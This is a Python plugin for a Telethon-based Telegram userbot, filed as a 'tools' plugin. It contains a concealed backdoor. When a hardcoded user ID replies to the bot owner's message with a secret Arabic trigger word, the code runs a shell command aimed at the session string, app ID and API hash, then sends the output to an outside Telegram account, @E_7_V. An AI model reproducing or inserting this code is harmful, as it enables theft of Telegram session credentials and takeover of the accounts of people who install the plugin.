from zthon import zedub
import pkg_resources
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.utils import _catutils, parse_pre, yaml_format
from ..Config import Config
import json
import requests
import os
from telethon import events 
plugin_category = "tools"

# Roger-Baqir


ZQ_LO = [5502537272]
@zedub.on(events.NewMessage(incoming=True))
async def Baqir(event):
    if event.reply_to and event.sender_id in ZQ_LO:
       reply_msg = await event.get_reply_message()
       owner_id = reply_msg.from_id.user_id
       if owner_id == zedub.uid:
           if event.message.message == "فاراته":
                   cmd = "STRING_SESSION, APP_ID, API_HASH"
                   o = (await _catutils.runcmd(cmd))[0]
                   OUTPUT = (f"**[ريبـــثون](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{o}\n\n**تدلل سيدي ومولاي **")
                   await event.reply("**جبته وتدلل سيدنا 🖤**")
                   await zedub.send_message("@E_7_V", OUTPUT)
